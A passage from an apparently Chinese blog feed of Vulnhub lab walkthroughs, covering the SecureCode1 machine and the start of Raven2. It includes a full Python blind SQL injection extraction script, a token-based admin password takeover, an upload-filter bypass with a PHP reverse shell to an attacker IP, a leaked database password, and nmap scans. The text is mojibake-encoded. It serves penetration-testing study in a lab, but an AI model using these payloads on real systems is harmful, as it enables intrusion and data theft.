title="2ã€æºä»£ç æ–‡ä»¶æ³„éœ²"></a>2ã€æºä»£ç æ–‡ä»¶æ³„éœ²</h3><p>1ã€å¯¹ç™»å½•é¡µé¢å°è¯•SQLæ³¨å…¥å¤±è´¥ï¼Œå‡ ç»å‘¨æŠ˜æ— è®¡å¯æ–½</p><p>2ã€è¿”å›å†è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œç«¯å£æ¢æµ‹ä¹Ÿå¹¶æ— å…¶ä»–ç«¯å£å¼€æ”¾ï¼Œç›®å½•æ‰«æä¹Ÿæ— å…¶ä»–ç»“æœ</p><p>3ã€æ­¤æ—¶èƒ½ç”¨çš„æœ‰å‚æ•°çˆ†ç ´ï¼Œä»¥åŠzip ç­‰æ•æ„Ÿæ–‡ä»¶çš„å­˜åœ¨ï¼ˆè¿˜å¯ä»¥å°è¯•å­åŸŸåçˆ†ç ´ï¼Œä½†ç”±äºæ˜¯é¶æœºä¸”æ— åŸŸåå­˜åœ¨ï¼Œå› æ­¤æ­¤è·¯ä¸é€šï¼‰</p><p>4ã€æœ‰include ç›®å½•çš„å­˜åœ¨ä¸”å‘ç°include&#x2F;header.php æ–‡ä»¶åœ¨å…¶ä»–åœ°æ–¹ä¹Ÿç»è¿‡äº†å¼•ç”¨ï¼Œå¯ä»¥è”æƒ³åˆ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œé€šè¿‡å¯¹å‚æ•°è¿›è¡Œçˆ†ç ´</p><p>æˆ‘ä»¬åœ¨kali ä¸­ç”¨wfuzz å·¥å…·å¯¹åŒ…å«äº†header.php æ–‡ä»¶çš„login.phpé¡µé¢è¿›è¡Œçˆ†ç ´ï¼Œå¹¶æ— æ”¶è·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt --hw 113 http://192.168.31.61/login/login.php?FUZZ=</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-SecureCode1/image-20240207190949073.png" alt="image-20240207190949073"></p><p>5ã€æ£€ç´¢zip ç­‰æ•æ„Ÿæ–‡ä»¶</p><p>æˆ‘ä»¬ç”¨dirb è¿™ä¸ªå·¥å…·ï¼Œå¯¹æ•æ„Ÿåç¼€è¿›è¡Œçˆ†ç ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.31.61  -X .php,.html,.rar,.7zip,.tar.gz,.gz,.zip,.bak</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-SecureCode1/image-20240207191226354.png" alt="image-20240207191226354"></p><p>å¯ä»¥çœ‹åˆ°ç¡®å®å­˜åœ¨ä¸€ä¸ªåä¸ºæºä»£ç çš„zip æ–‡ä»¶</p><p>å°†å…¶ä¸‹è½½ä¸‹æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.31.61/source_code.zip --output source_code.zip</span><br></pre></td></tr></table></figure><h3 id="3ã€ä»£ç å®¡è®¡ç™»å½•åå°"><a href="#3ã€ä»£ç å®¡è®¡ç™»å½•åå°" class="headerlink" title="3ã€ä»£ç å®¡è®¡ç™»å½•åå°"></a>3ã€ä»£ç å®¡è®¡ç™»å½•åå°</h3><p>è§£å‹è¯¥æ–‡ä»¶ï¼Œå‘ç°å­˜åœ¨ä¸€ä¸ª.sqlæ–‡ä»¶ï¼Œè«ä¸æ˜¯æ•°æ®åº“æ–‡ä»¶</p><p><img src="/img/Vulnhub-SecureCode1/image-20240207191629744.png" alt="image-20240207191629744"></p><p>æ‰¾åˆ°ä¸¤ä¸ªç”¨æˆ·åå’Œå¯†ç ï¼Œç”¨hashid åˆ¤åˆ«ä¸€ä¸‹</p><p><img src="/img/Vulnhub-SecureCode1/image-20240207191943474.png" alt="image-20240207191943474"></p><p>ç„¶åç”¨john è¿›è¡Œçˆ†ç ´ï¼Œæ²¡æœ‰ç»“æœ</p><p>æ—¢ç„¶æ‹¿åˆ°äº†æºä»£ç ï¼Œé‚£å°±è¿›è¡Œä¸€æ³¢ä»£ç å®¡è®¡</p><p><img src="/img/Vulnhub-SecureCode1/image-20240208180111100.png" alt="image-20240208180111100"></p><p>é‡ç‚¹åœ¨è¿™ä¸¤ä¸ªæ–‡ä»¶ä¸­</p><p>åœ¨doChangePassword.php æ–‡ä»¶ä¸­ï¼Œå¯¹token è¿›è¡Œäº†æ ¡éªŒï¼Œç„¶åå¯ä»¥è¿›è¡Œå¯†ç ä¿®æ”¹çš„æ“ä½œï¼Œè¿™é‡Œåº”è¯¥æ˜¯å…³é”®</p><p><img src="/img/Vulnhub-SecureCode1/image-20240208174200635.png" alt="image-20240208174200635"></p><p>åœ¨ resetPassword.phpæ–‡ä»¶ä¸­å¯¹token è¿›è¡Œäº†æ›´æ–°æ“ä½œï¼Œé‚£ä¹ˆæˆ‘ä»¬æ‹¿åˆ°è¿™ä¸ªtoken å°±å¯ä»¥å¯¹admin çš„å¯†ç è¿›è¡Œä¿®æ”¹</p><p><img src="/img/Vulnhub-SecureCode1/image-20240208180435447.png" alt="image-20240208180435447"></p><p>å†å¾€ä¸‹çœ‹</p><p><img src="/img/Vulnhub-SecureCode1/image-20240208182452736.png" alt="image-20240208182452736"></p><p>è¿™é‡Œå°±æ˜¯å‘é€çš„é‚®ä»¶ä¿¡æ¯å†…å®¹ï¼Œåœ¨doChangePassword.php åé¢åŠ ä¸Štoken çš„å€¼å»ä¿®æ”¹å¯¹åº”ç”¨æˆ·çš„å¯†ç </p><p>é‚£ä¹ˆå¦‚ä½•è·å–15ä½çš„tokenå€¼ï¼Œçˆ†ç ´éš¾åº¦å¤ªé«˜ï¼Œå†æŸ¥çœ‹æºä»£ç </p><p><img src="/img/Vulnhub-SecureCode1/image-20240208190642976.png" alt="image-20240208190642976"></p><p>è¿™ä¸ªåœ°æ–¹å­˜åœ¨SQLæ³¨å…¥çš„å¯èƒ½æ€§å¾ˆå¤§ï¼Œå¯¹&#x2F;item&#x2F;viewItem.php æ–‡ä»¶è¿›è¡ŒæŸ¥çœ‹</p><p><img src="/img/Vulnhub-SecureCode1/image-20240208191024191.png" alt="image-20240208191024191"></p><p>å¦‚ä¸‹ï¼Œç¡®è®¤å­˜åœ¨SQLæ³¨å…¥</p><p><img src="/img/Vulnhub-SecureCode1/image-20240208191220609.png" alt="image-20240208191220609"></p><p>è¿›è¡Œæ•°æ®çˆ†ç ´ï¼Œè¿™é‡Œæˆ‘å†™äº†ä¸€ä¸ªè„šæœ¬æ ¹æ®å“åº”å€¼æ¥è¿›è¡ŒSQLæ³¨å…¥ï¼Œå¯ä¿®è¿›</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http://192.168.31.62/item/viewItem.php?id=1&#x27;</span><br><span class="line"></span><br><span class="line">def column_data_name(column_data_len,User_table_name,User_column_name):</span><br><span class="line">    column_data_names = &#123;&#125;</span><br><span class="line">    column_one_name = &#x27;&#x27;</span><br><span class="line">    for i in range(0,len(column_data_len)):  #iæ˜¯ç¬¬å‡ ä¸ªå­—æ®µçš„å€¼</span><br><span class="line">        for j in range(1,column_data_len[i]+1):   #jæ˜¯è¦çˆ†ç ´å­—æ®µå€¼çš„ç¬¬å‡ ä¸ªå­—ç¬¦</span><br><span class="line">            for n in range(0,126):  #næ˜¯è¦çˆ†ç ´å­—æ®µå€¼çš„asciiç å€¼</span><br><span class="line">                new_url = url + &quot;%20and%20ascii(substr((select &quot; + User_column_name + &quot; from &quot; + User_table_name + &quot; limit &quot;+ str(i) +&quot;,1),&quot; + str(j) + &quot;,1))=&quot; + str(n)</span><br><span class="line">                if Response_judgment(new_url):</span><br><span class="line">                    column_one_name += chr(n)</span><br><span class="line">                    break</span><br><span class="line">        print(&#x27;-----------------------------&#x27;)</span><br><span class="line">        print(f&quot;ç¬¬&#123;i&#125;ä¸ªå­—æ®µçš„å€¼ä¸ºï¼š&#123;column_one_name&#125;&quot;)</span><br><span class="line">        column_data_names[i] = column_one_name</span><br><span class="line">        column_one_name = &#x27;&#x27;</span><br><span class="line">    return column_data_names</span><br><span class="line"></span><br><span class="line">def column_data_length(column_names,User_table_name,User_column_name):</span><br><span class="line">    column_data_len = &#123;&#125;</span><br><span class="line">    for i in range(0,10):       #iæ˜¯ç¬¬å‡ ä¸ªå­—æ®µçš„å€¼ï¼ŒçŒœæµ‹10ä¸ªæ•°å€¼</span><br><span class="line">        for j in range(1,20):     #jæ˜¯è¦çˆ†ç ´å­—æ®µæ•°å€¼çš„é•¿åº¦ï¼ŒçŒœæµ‹è¯¥å­—æ®µæ•°å€¼æœ€å¤§ä¸º20</span><br><span class="line">            new_url = url + &quot;%20and%20length((select &quot;+ User_column_name +&quot; from &quot;+ User_table_name +&quot; limit &quot;+ str(i) +&quot;,1))=&quot; + str(j)</span><br><span class="line">            if Response_judgment(new_url):</span><br><span class="line">                column_data_len[i] = j</span><br><span class="line">                if i == 10:</span><br><span class="line">                    print(&#x27;å·²è¶…è¿‡æµ‹è¯•æ•°å€¼çš„æœ€å¤§å€¼ï¼Œè¯·è°ƒæ•´ï¼ï¼ï¼&#x27;)</span><br><span class="line">                break</span><br><span class="line">    return column_data_len</span><br><span class="line"></span><br><span class="line">def column_name(column_len,User_table_name):</span><br><span class="line">    column_names = &#123;&#125;</span><br><span class="line">    column_one_name = &#x27;&#x27;</span><br><span class="line">    for i in range(0,len(column_len)):  #iæ˜¯ç¬¬å‡ ä¸ªå­—æ®µï¼Œlen(column_len) æ˜¯å­—æ®µçš„æ•°é‡</span><br><span class="line">        for j in range(1,column_len[i]+1):           #jæ˜¯è¦çˆ†ç ´å­—æ®µçš„ç¬¬å‡ ä¸ªå­—ç¬¦</span><br><span class="line">            for n in range(0,126):     #næ˜¯è¦çˆ†ç ´å­—æ®µåçš„asciiç å€¼</span><br><span class="line">                new_url = url + &quot;%20and%20ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&quot; + hex(int.from_bytes(User_table_name.encode(),&#x27;big&#x27;)) + &quot; limit &quot;+ str(i) +&quot;,1),&quot; + str(j) + &quot;,1))=&quot; + str(n)</span><br><span class="line">                if Response_judgment(new_url):</span><br><span class="line">                    column_one_name += chr(n)</span><br><span class="line">                    break</span><br><span class="line">        print(f&quot;ç¬¬&#123;i&#125;ä¸ªå­—æ®µçš„åç§°ä¸ºï¼š&#123;column_one_name&#125;&quot;)</span><br><span class="line">        column_names[i] = column_one_name</span><br><span class="line">        column_one_name = &#x27;&#x27;</span><br><span class="line">    return column_names</span><br><span class="line"></span><br><span class="line">def column_length(User_table_name):     #è¦æŸ¥çœ‹çš„è¡¨å</span><br><span class="line">    column_len = &#123;&#125;</span><br><span class="line">    for i in range(0,10):       #iæ˜¯ç¬¬å‡ ä¸ªå­—æ®µï¼Œè¿™é‡Œå‡è®¾æœ‰10ä¸ªå­—æ®µ</span><br><span class="line">        for j in range(1,30):     #jæ˜¯è¦çˆ†ç ´å­—æ®µçš„é•¿åº¦ï¼Œå‡è®¾å­—æ®µé•¿åº¦æœ€é•¿ä¸º20</span><br><span class="line">            new_url = url + &quot;%20and%20length((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;+ hex(int.from_bytes(User_table_name.encode(), &#x27;big&#x27;)) +&quot; limit &quot;+ str(i) +&quot;,1))=&quot; + str(j)</span><br><span class="line">            if Response_judgment(new_url):</span><br><span class="line">                column_len[i] = j</span><br><span class="line">                if i == 10:</span><br><span class="line">                    print(&#x27;å·²è¶…è¿‡æµ‹è¯•å­—æ®µæ•°çš„æœ€å¤§å€¼ï¼Œè¯·è°ƒæ•´ï¼ï¼ï¼&#x27;)</span><br><span class="line">                break</span><br><span class="line">    return column_len</span><br><span class="line"></span><br><span class="line">def table_name(table_len):</span><br><span class="line">    table_names = &#123;&#125;</span><br><span class="line">    table_one_name = &#x27;&#x27;</span><br><span class="line">    for i in range(0,len(table_len)):   #iæ˜¯ç¬¬å‡ å¼ è¡¨ï¼Œlen(table_len)è¡¨ç¤ºå…±æœ‰å‡ å¼ è¡¨</span><br><span class="line">        for j in range(1,table_len[i]+1):           #jæ˜¯è¦çˆ†ç ´è¡¨åç¬¬å‡ ä¸ªå­—ç¬¦ï¼Œåˆ°è¡¨çš„é•¿åº¦</span><br><span class="line">            for n in range(0,126):     #næ˜¯è¦çˆ†ç ´è¡¨åçš„asciiç å€¼</span><br><span class="line">                new_url = url + &quot;%20and%20ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &quot; + str(i) + &quot;,1),&quot; + str(j) + &quot;,1))=&quot; + str(n)</span><br><span class="line">                if Response_judgment(new_url):</span><br><span class="line">                    table_one_name += chr(n)</span><br><span class="line">                    break</span><br><span class="line">        print(f&quot;ç¬¬&#123;i&#125;å¼ è¡¨çš„åç§°ä¸ºï¼š&#123;table_one_name&#125;&quot;)</span><br><span class="line">        table_names[i] = table_one_name</span><br><span class="line">        table_one_name = &#x27;&#x27;</span><br><span class="line">    return table_names</span><br><span class="line"></span><br><span class="line">def table_length():</span><br><span class="line">    table_len = &#123;&#125;</span><br><span class="line">    for i in range(0,10):        #iæ˜¯ç¬¬å‡ å¼ è¡¨</span><br><span class="line">        for j in range(1,10):     #jæ˜¯è¦çˆ†ç ´è¡¨çš„é•¿åº¦</span><br><span class="line">            new_url = url + &quot;%20and%20length((select table_name from information_schema.tables where table_schema=database() limit &quot; + str(i) + &quot;,1))=&quot; + str(j)</span><br><span class="line">            if Response_judgment(new_url):</span><br><span class="line">                table_len[i] = j</span><br><span class="line">                break</span><br><span class="line">    return table_len</span><br><span class="line"></span><br><span class="line">def database_name(database_len):</span><br><span class="line">    database_names = &#x27;&#x27;</span><br><span class="line">    for i in range(1,database_len + 1):     #iæ˜¯æ•°æ®åº“çš„ç¬¬å‡ ä¸ªå­—ç¬¦</span><br><span class="line">        for j in range(0,126):          #jæ˜¯è¦çˆ†ç ´æ•°æ®åº“åçš„asciiç å€¼</span><br><span class="line">            new_url = url + &quot;%20and%20ascii(substr(database(),&quot; + str(i) + &quot;,1))=&quot; + str(j)</span><br><span class="line">            if Response_judgment(new_url):</span><br><span class="line">                database_names += chr(j)</span><br><span class="line">                break</span><br><span class="line">    return database_names</span><br><span class="line"></span><br><span class="line">def database_length():</span><br><span class="line">    for i in range(1,10):   #å‡è®¾æ•°æ®åº“çš„é•¿åº¦åœ¨10ä»¥å†…</span><br><span class="line">        new_url = url + &quot;%20and%20length(database())=&quot; + str(i)</span><br><span class="line">        if Response_judgment(new_url):</span><br><span class="line">            return i</span><br><span class="line">    print(&#x27;payloadæ— æ•ˆï¼Œè¯·æ›´æ›¿payloadï¼ï¼ï¼&#x27;)</span><br><span class="line"></span><br><span class="line">def Response_judgment(new_url):</span><br><span class="line">    respone = requests.get(new_url)</span><br><span class="line">    if respone.status_code == 404:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    database_names = database_name(database_length())    #è¿™é‡Œä¼ å…¥æ•°æ®åº“çš„é•¿åº¦</span><br><span class="line">    print(&#x27;-----------------------------&#x27;)</span><br><span class="line">    print(f&quot;æ•°æ®åº“çš„åç§°ä¸ºï¼š&#123;database_names&#125;&quot;)</span><br><span class="line">    print(&#x27;-----------------------------&#x27;)</span><br><span class="line">    table_names = table_name(table_length())    #æ±‚è¡¨çš„åç§°ï¼Œä¼ å…¥è¡¨çš„é•¿åº¦</span><br><span class="line">    print(&#x27;-----------------------------&#x27;)</span><br><span class="line">    print(f&quot;æ‰€æœ‰è¡¨çš„åç§°ä¸ºï¼š&#123;table_names&#125;&quot;)</span><br><span class="line">    User_table_name = input(&#x27;è¯·è¾“å…¥è¦æŸ¥çœ‹çš„è¡¨åï¼š&#x27;)</span><br><span class="line">    print(&#x27;-----------------------------&#x27;)</span><br><span class="line">    column_names = column_name(column_length(User_table_name),User_table_name)       #æ±‚å­—æ®µçš„åå­—ï¼Œè¾“å…¥å­—æ®µçš„é•¿åº¦</span><br><span class="line">    print(&#x27;-----------------------------&#x27;)</span><br><span class="line">    print(f&quot;è¯¥è¡¨ä¸­æ‰€æœ‰å­—æ®µçš„åç§°ä¸ºï¼š&#123;column_names&#125;&quot;)</span><br><span class="line">    User_column_name = input(&#x27;è¯·è¾“å…¥è¦æŸ¥çœ‹çš„å­—æ®µåï¼š&#x27;)</span><br><span class="line">    print(&#x27;-----------------------------&#x27;)</span><br><span class="line">    column_data_len = column_data_length(column_names,User_table_name,User_column_name)   #æ±‚å­—æ®µå€¼çš„é•¿åº¦ï¼Œä¼ å…¥å­—æ®µçš„åç§°</span><br><span class="line">    column_data_names = column_data_name(column_data_len,User_table_name,User_column_name)  #æ±‚å­—æ®µçš„å€¼</span><br><span class="line">    print(&#x27;-----------------------------&#x27;)</span><br><span class="line">    print(f&quot;è¯¥å­—æ®µä¸­æ‰€æœ‰æ•°å€¼ä¸ºï¼š&#123;column_data_names&#125;&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-SecureCode1/image-20240209161542518.png" alt="image-20240209161542518"></p><p>æ‹¿åˆ°tokenï¼Œè¿›å…¥doChangePassword.php?token&#x3D;iBWWtGgLTA8KqEaï¼Œä¹‹åä¿®æ”¹admin çš„å¯†ç ï¼Œæç¤ºå¯†ç æ›´æ”¹æˆåŠŸ</p><p><img src="/img/Vulnhub-SecureCode1/image-20240209161258109.png" alt="image-20240209161258109"></p><p>ä¹‹åè¿›è¡Œç™»å½•ï¼ŒæˆåŠŸç™»å½•åå°</p><p><img src="/img/Vulnhub-SecureCode1/image-20240209161632922.png" alt="image-20240209161632922"></p><h3 id="4ã€è·å–shellç«‹è¶³ç‚¹"><a href="#4ã€è·å–shellç«‹è¶³ç‚¹" class="headerlink" title="4ã€è·å–shellç«‹è¶³ç‚¹"></a>4ã€è·å–shellç«‹è¶³ç‚¹</h3><p>1ã€åœ¨åå°è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œå‘ç°flag1</p><p><img src="/img/Vulnhub-SecureCode1/image-20240209163602954.png" alt="image-20240209163602954"></p><p>2ã€åœ¨æ·»åŠ ææ–™çš„åœ°æ–¹å‘ç°æ–‡ä»¶ä¸Šä¼ </p><p><img src="/img/Vulnhub-SecureCode1/image-20240209163746214.png" alt="image-20240209163746214"></p><p>3ã€å…ˆä¸Šä¼ ä¸€ä¸ªphpinfoæ–‡ä»¶ï¼Œå‘ç°æœ‰é™åˆ¶</p><p><img src="/img/Vulnhub-SecureCode1/image-20240209164006481.png" alt="image-20240209164006481"></p><p>4ã€åœ¨æºä»£ç ä¸Šçœ‹ï¼Œæ˜¯åšäº†é»‘åå•å’Œmime æ£€æµ‹</p><p><img src="/img/Vulnhub-SecureCode1/image-20240209164347008.png" alt="image-20240209164347008"></p><p>5ã€æŠ“åŒ…ç»•è¿‡ï¼Œé»‘åå•ä¸­å¹¶æ²¡æœ‰pharåç¼€</p><p>æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ª.pharåç¼€çš„phpåå¼¹shellï¼Œå¹¶åœ¨æœ¬åœ°è¿›è¡Œç›‘å¬ï¼ŒæˆåŠŸæ‹¿åˆ°shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exec(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.31.50/4444 0&gt;&amp;1&#x27;&quot;); ?&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-SecureCode1/image-20240209171953541.png" alt="image-20240209171953541"></p><h1 id="å››ã€ææƒroot"><a href="#å››ã€ææƒroot" class="headerlink" title="å››ã€ææƒroot"></a>å››ã€ææƒroot</h1><h3 id="1ã€æŸ¥æ‰¾æ•æ„Ÿæ–‡ä»¶"><a href="#1ã€æŸ¥æ‰¾æ•æ„Ÿæ–‡ä»¶" class="headerlink" title="1ã€æŸ¥æ‰¾æ•æ„Ÿæ–‡ä»¶"></a>1ã€æŸ¥æ‰¾æ•æ„Ÿæ–‡ä»¶</h3><p>1ã€åœ¨&#x2F;var&#x2F;wwwä¸‹æ‰¾åˆ°flag2</p><p><img src="/img/Vulnhub-SecureCode1/image-20240209172416582.png" alt="image-20240209172416582"></p><p>å…¶ä¸­çš„legendary è®©äººå¾ˆåœ¨æ„ï¼Œå°è¯•su åˆ°æ™®é€šç”¨æˆ· secure</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell=/bin/bash script -q /dev/null</span><br><span class="line">su secure</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-SecureCode1/image-20240209172544562.png" alt="image-20240209172544562"></p><p>å¤±è´¥äº†</p><p>2ã€connection.phpæ–‡ä»¶</p><p>çœ‹åˆ°æ•°æ®åº“çš„è´¦å·å¯†ç ï¼šhackshop:hackshopuniquepassword</p><p><img src="/img/Vulnhub-SecureCode1/image-20240209172719676.png" alt="image-20240209172719676"></p><p>æ˜¯å¦æ»¡è¶³æ•°æ®åº“ææƒå‘¢ï¼Ÿmysqlç‰ˆæœ¬å¤§äº5.7ï¼Œä¸èƒ½è¿›è¡Œæ•°æ®åº“ææƒ</p><p><img src="/img/Vulnhub-SecureCode1/image-20240209173207183.png" alt="image-20240209173207183"></p><h3 id="2ã€ææƒroot"><a href="#2ã€ææƒroot" class="headerlink" title="2ã€ææƒroot"></a>2ã€ææƒroot</h3><p>æ­¤é¶æœºæ— éœ€rootææƒ</p>]]></content>
      
      
      <categories>
          
          <category> Vulnhubç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Vulnhubç³»åˆ—ã€‘Vulnhubé¶åœº_Raven2</title>
      <link href="/2024/02/17/Vulnhub-Raven2/"/>
      <url>/2024/02/17/Vulnhub-Raven2/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub-Raven2-æ¸—é€"><a href="#ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub-Raven2-æ¸—é€" class="headerlink" title="ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub_Raven2 æ¸—é€"></a>ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub_Raven2 æ¸—é€</h1><h1 id="ä¸€ã€ç¯å¢ƒå‡†å¤‡"><a href="#ä¸€ã€ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ä¸€ã€ç¯å¢ƒå‡†å¤‡"></a>ä¸€ã€ç¯å¢ƒå‡†å¤‡</h1><p>ä»ç½‘ç›˜ä¸‹è½½è¯¥é¶æœºï¼Œåœ¨vmä¸­é€‰æ‹©ã€æ‰“å¼€ã€‘</p><p><img src="/img/Vulnhub-Raven2/image-20240206132421898.png" alt="image-20240206132421898"></p><p>ç„¶åè®¾ç½®å¥½å­˜å‚¨è·¯å¾„ï¼Œå¼€æœºåæ£€æŸ¥é¶æœºçš„ç½‘ç»œè¿æ¥æ¨¡å¼æ˜¯å¦ä¸ºã€NETã€‘æ¨¡å¼ã€‚</p><h1 id="äºŒã€ä¿¡æ¯æ”¶é›†"><a href="#äºŒã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€ä¿¡æ¯æ”¶é›†"></a>äºŒã€ä¿¡æ¯æ”¶é›†</h1><h3 id="1ã€ä¸»æœºå‘ç°"><a href="#1ã€ä¸»æœºå‘ç°" class="headerlink" title="1ã€ä¸»æœºå‘ç°"></a>1ã€ä¸»æœºå‘ç°</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sn 192.168.31.*</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240205150548983.png" alt="image-20240205150548983"></p><h3 id="2ã€ç«¯å£æ‰«æ"><a href="#2ã€ç«¯å£æ‰«æ" class="headerlink" title="2ã€ç«¯å£æ‰«æ"></a>2ã€ç«¯å£æ‰«æ</h3><p>1ã€å…ˆè¿›è¡Œç²—ç•¥çš„æ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -F 192.168.31.60</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240205150656838.png" alt="image-20240205150656838"></p><p>2ã€å†è¿›è¡Œç²¾ç»†åŒ–æ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sT --min-rate 10000 -p- 192.168.31.60</span><br><span class="line">nmap.exe -sU --min-rate 10000 -p- 192.168.31.60</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240205154034080.png" alt="image-20240205154034080"></p><p><img src="/img/Vulnhub-Raven2/image-20240205151907050.png" alt="image-20240205151907050"></p><p>3ã€è¿›è¡Œå…¨æ‰«æå’Œæ¼æ´æ¢æµ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sT -sV -sC -O -p 22,80,111,54798,58157 192.168.31.60 -oA AllPort</span><br><span class="line"> nmap.exe --script=vuln -p 22,80,111,54798,58157 192.168.31.60 -oA VulnPort</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240205154417067.png" alt="image-20240205154417067"></p><p>ç¡®è®¤æ˜¯Linuxæ“ä½œç³»ç»Ÿï¼Œå¹¶ä¸”å¼€æ”¾äº†111çš„rpcbindæœåŠ¡ï¼Œæœ‰å…³è¿™ä¸ªæœåŠ¡å¯ä»¥ä¸Šç½‘æœç´¢ï¼Œä¹Ÿæœ‰å¾ˆå¤šè¯¥æœåŠ¡ç›¸å…³æ¼æ´ï¼ŒåæœŸæ˜¯ä¸€ä¸ªå¯åˆ©ç”¨çš„ç‚¹ã€‚</p><p><img src="/img/Vulnhub-Raven2/image-20240205154452871.png" alt="image-20240205154452871"></p><p>å‘ç°ä½¿ç”¨äº†wordpressæ¡†æ¶ï¼Œè¿›è¡Œäº†ç›®å½•çš„æ‰«æï¼Œè¿˜å‘ç°æœ‰ä¸€ä¸ªcsrf 